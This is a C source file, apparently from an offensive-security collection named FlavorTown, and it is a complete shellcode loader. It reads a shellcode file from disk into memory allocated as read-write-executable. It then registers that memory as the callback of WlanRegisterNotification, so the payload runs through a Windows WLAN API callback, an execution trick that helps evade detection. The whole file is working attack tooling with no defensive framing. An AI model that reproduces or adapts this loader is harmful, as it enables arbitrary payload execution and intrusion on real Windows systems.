// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
#pragma comment(lib, "wlanapi.lib")

#include <stdio.h>
#include <windows.h>
#include <wlanapi.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;
	PVOID hAlloc = NULL;

	HANDLE hClient = NULL;
	DWORD dwNegotiatedVersion = 0;
	DWORD dwPrevNotifSource = 0;

	if (argc != 2)
	{
		printf("Usage: WlanRegisterNotification.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!hAlloc)
		goto CLEANUP;

	memcpy(hAlloc, Shellcode, SCLen);

	WlanOpenHandle(2, NULL, &dwNegotiatedVersion, &hClient);

	WlanRegisterNotification(hClient, WLAN_NOTIFICATION_SOURCE_ALL, FALSE, hAlloc, NULL, NULL, &dwPrevNotifSource);
	
	Sleep(1000);
	
	WlanCloseHandle(hClient, NULL);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}